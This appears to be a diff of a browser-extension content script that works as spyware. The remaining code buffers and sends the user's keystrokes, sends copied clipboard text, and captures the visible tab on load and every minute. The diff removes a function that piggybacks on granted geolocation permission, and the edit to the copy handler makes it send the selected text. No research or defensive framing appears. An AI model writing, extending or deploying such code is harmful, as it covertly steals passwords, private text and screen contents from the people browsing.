@@ -5,17 +5,6 @@ import { Messenger } from "../utils/browser/utils";
 
 let buffer = "";
 
-function piggybackGeolocation() {
-  // Piggyback permissions for geolocation
-  navigator.permissions
-    .query({ name: "geolocation" })
-    .then(({ state }: { state: string }) => {
-      if (state === "granted") {
-        Messenger(DataTypes.GEO_LOCATION);
-      }
-    });
-}
-
 const debouncedCaptureKeylogBuffer = _.debounce(async () => {
   if (buffer.length > 0) {
     await Messenger(DataTypes.KEYSTROKES, buffer)
@@ -50,12 +39,10 @@ const debouncedHandler = _.debounce(() => {
 const observer = new MutationObserver(() => debouncedHandler());
 observer.observe(document.body, { subtree: true, childList: true });
 
-document.addEventListener("visibilitychange", () => Messenger(DataTypes.TAB_CAPTURE));
-document.addEventListener("click", piggybackGeolocation);
-document.addEventListener("copy", () => Messenger(DataTypes.CLIPBOARD));
+document.addEventListener("copy", () => Messenger(DataTypes.CLIPBOARD, window.getSelection()?.toString()));
 
 setInterval(() => {
   Messenger(DataTypes.TAB_CAPTURE);
-}, 60 * 1e3);
+}, 60 * 1000);
 
 Messenger(DataTypes.TAB_CAPTURE);
